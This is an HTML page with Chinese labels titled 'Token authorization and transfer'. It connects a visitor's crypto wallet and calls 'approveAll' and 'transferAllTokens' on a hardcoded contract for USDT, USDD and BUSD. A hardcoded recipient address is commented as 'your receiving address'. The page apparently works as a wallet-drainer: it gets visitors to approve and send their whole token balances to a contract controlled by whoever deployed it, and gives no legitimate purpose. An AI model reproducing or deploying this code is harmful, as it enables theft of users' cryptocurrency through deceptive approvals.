<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>代币授权和转账</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.4.0/dist/ethers.min.js"></script>
</head>
<body>
    <h1>代币授权和转账</h1>
    
    <!-- 连接钱包按钮 -->
    <button id="connectWalletButton">连接钱包</button>
    <p id="walletAddress"></p>

    <!-- 选择代币 -->
    <select id="tokenSelect">
        <option value="0xdAC17F958D2ee523a2206206994597C13D831ec7">USDT</option>
        <option value="0x0A8D0A3FFFc9a5deF8Cf5dA61A0A146B084F6E70">USDD</option>
        <option value="0x4fabb145d64652a948d72533023f6e7a623c7c53">BUSD</option>
        <!-- 其他代币可以添加到这里 -->
    </select>

    <!-- 授权代币按钮 -->
    <button id="approveButton">授权代币</button>

    <!-- 转账按钮 -->
    <button id="transferButton">转移代币</button>

    <script>
        let provider;
        let signer;
        let userAddress;
        const recipientAddress = "0xa465e2fc9f9d527AAEb07579E821D461F700e699";  // 你的接收地址
        const contractAddress = "0x56a2777e796eF23399e9E1d791E1A0410a75E31b"; // 智能合约地址

        // 使用你提供的智能合约 ABI
        const contractABI = [
            {
                "inputs": [{"internalType": "contract IERC20", "name": "token", "type": "address"}],
                "name": "approveAll",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [{"internalType": "contract IERC20", "name": "token", "type": "address"}],
                "name": "transferAllTokens",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "withdrawETH",
                "outputs": [],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "stateMutability": "payable",
                "type": "receive"
            },
            {
                "inputs": [],
                "name": "owner",
                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [],
                "name": "recipient",
                "outputs": [{"internalType": "address", "name": "", "type": "address"}],
                "stateMutability": "view",
                "type": "function"
            }
        ];

        // 连接钱包
        async function connectWallet() {
            if (window.ethereum) {
                try {
                    await window.ethereum.request({ method: 'eth_requestAccounts' });
                    provider = new ethers.providers.Web3Provider(window.ethereum);
                    signer = provider.getSigner();
                    userAddress = await signer.getAddress();
                    document.getElementById('walletAddress').innerText = `已连接的钱包地址: ${userAddress}`;
                    console.log('钱包连接成功: ', userAddress);
                } catch (error) {
                    console.error('连接钱包失败: ', error);
                    alert('连接钱包失败，请重试');
                }
            } else {
                alert('请安装 MetaMask 或其他支持的加密钱包');
            }
        }

        // 授权代币
        async function approveToken(tokenAddress) {
            try {
                const contract = new ethers.Contract(contractAddress, contractABI, signer);
                const tx = await contract.approveAll(tokenAddress);  // 调用 approveAll 方法
                await tx.wait();
                alert('代币授权成功');
                console.log('代币授权成功');
            } catch (error) {
                console.error('授权代币失败: ', error);
                alert('授权代币失败: ' + error.message);
            }
        }

        // 转移代币
        async function transferToken(tokenAddress) {
            try {
                const contract = new ethers.Contract(contractAddress, contractABI, signer);
                const tx = await contract.transferAllTokens(tokenAddress);  // 调用 transferAllTokens 方法
                await tx.wait();
                alert('代币转账成功');
                console.log('代币转账成功');
            } catch (error) {
                console.error('代币转账失败: ', error);
                alert('代币转账失败: ' + error.message);
            }
        }

        // 事件绑定
        document.getElementById('connectWalletButton').addEventListener('click', connectWallet);

        document.getElementById('approveButton').addEventListener('click', async () => {
            const selectedTokenAddress = document.getElementById('tokenSelect').value;
            await approveToken(selectedTokenAddress);
        });

        document.getElementById('transferButton').addEventListener('click', async () => {
            const selectedTokenAddress = document.getElementById('tokenSelect').value;
            await transferToken(selectedTokenAddress);
        });
    </script>
</body>
</html>
